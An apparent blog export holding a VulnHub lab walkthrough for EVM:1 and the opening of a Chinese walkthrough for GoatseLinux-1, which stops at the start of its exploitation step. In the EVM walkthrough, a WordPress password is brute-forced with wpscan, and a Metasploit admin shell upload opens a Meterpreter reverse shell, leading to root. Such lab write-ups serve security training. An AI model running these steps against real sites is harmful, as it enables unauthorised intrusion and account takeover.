    <url>/2020/05/23/evm/</url>
    <content><![CDATA[<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: EVM: 1<br>Date release: 2 Nov 2019</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyNGIXBWVjFDS1lJIUFCQ3BRMHFVZGJ1WUlzemYwbGpIMXc=">https://mega.nz/#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1w<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YQ==">https://download.vulnhub.com/evm/EVM.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YS50b3JyZW50">https://download.vulnhub.com/evm/EVM.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>This is super friendly box intended for Beginner’s</p>
<p>This may work better with VirtualBox than VMware</p>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -T4 -p- -v -A 192.168.56.103</span></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)</span><br><span class="line">|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)</span><br><span class="line">|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)</span><br><span class="line">53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.10.3-P4-Ubuntu</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP RESP-CODES CAPA UIDL SASL AUTH-RESP-CODE</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR more ENABLE have listed post-login capabilities Pre-login IMAP4rev1 LOGINDISABLEDA0001</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sat May 23 02:15:27 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s</span><br><span class="line">| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|_  System time: 2020-05-23T02:20:13-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-05-23T06:20:13</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>

<ul>
<li>Enumeration</li>
</ul>
<p>use dirb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.103/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 25 06:24:07 2020</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:10821)                                            </span><br><span class="line">+ http://192.168.56.103/info.php (CODE:200|SIZE:83014)                                              </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:302)                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/index.php (CODE:301|SIZE:0)                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-includes/                                         </span><br><span class="line">+ http://192.168.56.103/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/css/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/images/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/includes/                                   </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/js/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/maint/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/network/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/user/                                       </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/index.php (CODE:200|SIZE:0)                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/plugins/                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/themes/                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/uploads/                                  </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                      </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                      </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                         </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                         </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                    </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon May 25 06:24:47 2020</span><br><span class="line">DOWNLOADED: 36896 - FOUND: 14</span><br></pre></td></tr></table></figure>

<p>use wpscan for more information</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.103/wordpress/ -e at -e ap -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Mon May 25 06:27:45 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.103/wordpress/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.103/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.2.4 identified (Insecure, released on 2019-10-14).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.4&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-03-31T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.5</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: &#x27;</span>Version: 1.4<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=======================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] c0rrupt3d_brain</span></span><br><span class="line"><span class="string"> | Found By: Author Posts - Author Pattern (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br></pre></td></tr></table></figure>

<p>now use wpscan bruteforce user c0rrupt3d_brain’s password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying c0rrupt3d_brain / 24992499 Time: 00:01:55 &lt;============================&gt; (10700 / 10700) 100.00% Time: 00:01:55</span><br><span class="line">[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                </span><br><span class="line">                                                                                                            </span><br><span class="line">[i] Valid Combinations Found:                                                                                 </span><br><span class="line"> | Username: c0rrupt3d_brain, Password: 24992499</span><br></pre></td></tr></table></figure>

<p>and we got Username: c0rrupt3d_brain, Password: 24992499</p>
<h3 id="get-a-shell-by-using-msf"><a href="#get-a-shell-by-using-msf" class="headerlink" title="get a shell by using msf"></a>get a shell by using msf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> rhosts 192.168.56.103</span><br><span class="line">rhosts =&gt; 192.168.56.103</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> username c0rrupt3d_brain</span><br><span class="line">username =&gt; c0rrupt3d_brain</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="built_in">set</span> password 24992499</span><br><span class="line">password =&gt; 24992499</span><br><span class="line">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.126:4444 </span><br><span class="line">[*] Authenticating with WordPress using c0rrupt3d_brain:24992499...</span><br><span class="line">[+] Authenticated with WordPress</span><br><span class="line">[*] Preparing payload...</span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[*] Executing the payload at /wordpress/wp-content/plugins/xryoFXviCZ/GWcWlbcKol.php...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.103</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.56.126:4444 -&gt; 192.168.56.103:52970) at 2020-05-25 06:39:50 -0400</span><br><span class="line">[+] Deleted GWcWlbcKol.php</span><br><span class="line">[+] Deleted xryoFXviCZ.php</span><br><span class="line">[+] Deleted ../xryoFXviCZ</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>then we got root’s password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat .root_password_ssh.txt</span><br><span class="line">cat .root_password_ssh.txt</span><br><span class="line">willy26</span><br></pre></td></tr></table></figure>

<h3 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ su root</span><br><span class="line">su root</span><br><span class="line">Password: willy26</span><br><span class="line"></span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="comment"># cd ~</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">proof.txt</span><br><span class="line">root@ubuntu-extermely-vulnerable-m4ch1ine:~<span class="comment"># cat proof.txt</span></span><br><span class="line">cat proof.txt</span><br><span class="line">voila you have successfully pwned me :) !!!</span><br><span class="line">:D</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg"></li>
</ul>
<p>Just such a simplest machine i have ever tried…:)</p>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>wpscan find wordpress user</li>
<li>wpscan bruteforce wordpress user’s pass</li>
<li>msf exploit/unix/webapp/wp_admin_shell_upload module to get a shell</li>
<li>root’s password disclosure</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[GoatseLinux-1]</title>
    <url>/2019/12/18/GoatseLinux-1/</url>
    <content><![CDATA[<p>名称：GoatseLinux：1<br>发布日期：2009年6月27日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL25ldXRyb25zdGFyLm9yZy90bXAvR29hdHNlTGludXhfMS4wX1ZNLnJhcg==">http://neutronstar.org/tmp/GoatseLinux_1.0_VM.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2F0c2VsaW51eC9Hb2F0c2VMaW51eF8xLjBfVk0ucmFy">https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2F0c2VsaW51eC9Hb2F0c2VMaW51eF8xLjBfVk0ucmFyLnRvcnJlbnQ=">https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>GoatseLinux v1.0 Pentest实验室虚拟机<br>史蒂夫·波顿<br>2009.06.27<br>在gnu许可下广泛分发。<br>这是专门为VMware 6.5兼容性而构建的。<br>警告：GoatseLinux是不安全的。 它被设计为用于进行渗透测试的实验室工具箱。 由于几乎所有安装的程序都具有广泛的开放性，因此强烈建议您不要将VM网络设置为除“基于主机”之外的任何方式，除非您喜欢将VM用作僵尸垃圾邮件箱。<br>笔记：<br>建立在Slax 5.0.7版本上。<br>资料来源：readme.txt</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap伺候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.132</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">MAC Address: 00:0C:29:0A:54:68 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -p- -v 192.168.142.132</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh     OpenSSH 3.5p1 (protocol 1.99)</span><br><span class="line">25/tcp    open  smtp    Sendmail</span><br><span class="line">53/tcp    open  domain  ISC BIND 8.2.2-REL</span><br><span class="line">80/tcp    open  http    Apache httpd 1.3.31 ((Unix))</span><br><span class="line">587/tcp   open  smtp    Sendmail</span><br><span class="line">631/tcp   open  ipp     CUPS 1.1</span><br><span class="line">3306/tcp  open  mysql   MySQL (unauthorized)</span><br><span class="line">10000/tcp open  http    MiniServ 0.01 (Webmin httpd)</span><br></pre></td></tr></table></figure>

<p>发现:</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMi8=">http://192.168.142.132/<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub68.jpg"></p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMi9nb2F0c2UuaHRtbA==">http://192.168.142.132/goatse.html<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub69.jpg"></p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMjoxMDAwMC8=">http://192.168.142.132:10000/<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub70.jpg"></p>
<p>是基于Web的系统管理工具Webmin。Metasploit提供了三种漏洞利用:一个用于shell，两个用于获取任意文件的辅助模块。</p>
<p>msf伺候</p>
